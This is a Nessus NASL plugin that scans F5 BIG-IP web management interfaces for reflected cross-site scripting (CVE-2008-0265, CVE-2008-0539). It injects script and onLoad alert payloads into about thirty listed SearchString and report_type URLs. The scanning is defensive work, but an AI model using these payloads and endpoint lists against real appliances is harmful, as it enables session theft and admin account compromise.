# bigip_web_xss.nasl
#
# Notes:
#
# - Some pages are way bigger than 8K and BIG-IP does not use Content-Length.
#   The script uses custom http_send_recv_length() to retrieve the entire page.
#
# History:
#
# 1.00, 12/6/07
# - Initial release

# Changes by Tenable:
# - Revised plugin title (4/28/09)


include("compat.inc");

if (description)
    {
    script_id(30217);
    script_version("$Revision: 1.11 $");

    script_name(english:"F5 BIG-IP Web Management Multiple XSS");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by multiple cross-site scripting
vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The F5 BIG-IP web management interface on the remote host is
susceptible to cross-site scripting attacks." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/486217/100/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/487118/100/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(79);

    script_summary(english:"Attempts XSS against F5 BIG-IP web management interface");
    script_family(english:"CGI abuses : XSS");
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/02/11");
 script_cvs_date("$Date: 2011/03/11 21:52:31 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

    script_category(ACT_ATTACK);
    script_cve_id("CVE-2008-0265","CVE-2008-0539");
    script_bugtraq_id(27272,27462);
    script_osvdb_id(40345, 40346, 40347, 40348, 40349, 40350, 40692);
    script_copyright(english:"This script is Copyright (C) 2008-2011 nnposter");
    script_dependencies("bigip_web_detect.nasl","http_login.nasl");
    script_require_keys("www/bigip");
    script_require_ports("Services/www",443);
    exit(0);
    }


include("url_func.inc");
include("http_func.inc");


function http_send_recv_length (port,data,length)
{
 local_var sock,resp;

 sock = http_open_socket(port);
 if (!sock) return NULL;
 send(socket:sock,data:data);
 resp = http_recv_length(socket:sock,bodylength:length);
 http_close_socket(sock);
 return resp;
}


function inject_xss (url,xss,port)
{
local_var req,resp,match;
 req = http_get(item:string(url,urlencode(str:xss)),port:port);
 resp = http_send_recv_length(port:port,data:req,length:64000);
 if ( resp )
 {
  if ( xss >< resp ) return TRUE;
 }
 return FALSE;
}


if (!get_kb_item("www/bigip")) exit(0);
port=get_http_port(default:443);
if (!get_tcp_port_state(port) || !get_kb_item("www/"+port+"/bigip")) exit(0);

search_xss='" type="hidden">'
          +'<script>alert("'+SCRIPT_NAME+'")</script>'
          +'<input type="hidden" value="';

url=make_list();
xss=make_list();

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/virtual_server/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/profile/http/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/profile/ftp/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/profile/rtsp/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/profile/sip/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/profile/persistence/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/profile/fastl4/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/profile/fasthttp/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/profile/httpclass/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/profile/tcp/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/profile/udp/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/profile/sctp/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/profile/clientssl/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/profile/serverssl/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/profile/authn/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/profile/connpool/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/profile/statistics/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/profile/stream/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/pool/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/node/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/monitor/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/locallb/ssl_certificate/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/system/user/list.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/system/log/list_system.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/system/log/list_pktfilter.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/system/log/list_ltm.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/system/log/resources_audit.jsp?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/tmui/Control/jspmap/tmui/system/log/list_asm.jsp?SearchString=";
xss[i]=search_xss;

#This better fail; the page is not vulnerable
i=max_index(url);
url[i]="/tmui/Control/jspmap/xsl/auth_partition/list?SearchString=";
xss[i]=search_xss;

i=max_index(url);
url[i]="/dms/policy/rep_request.php?report_type=";
xss[i]='"><body onLoad=alert(&quot;'+SCRIPT_NAME+'&quot;)><foo ';

found="";

for (i=0; i<max_index(url); ++i)
    if (inject_xss(url:url[i],xss:xss[i], port:port))
        found+= '\n' + ereg_replace(string:url[i],pattern:"\?.*$",replace:"");

if (strlen(found) == 0 ) exit(0);

set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
security_warning(port:port,
                 extra:'The URLs listed below have been found vulnerable :\n'+
                       '\n'+
                       found +
                       '\n' +
                       'This list depends on privileges granted to the attacked user.\n');

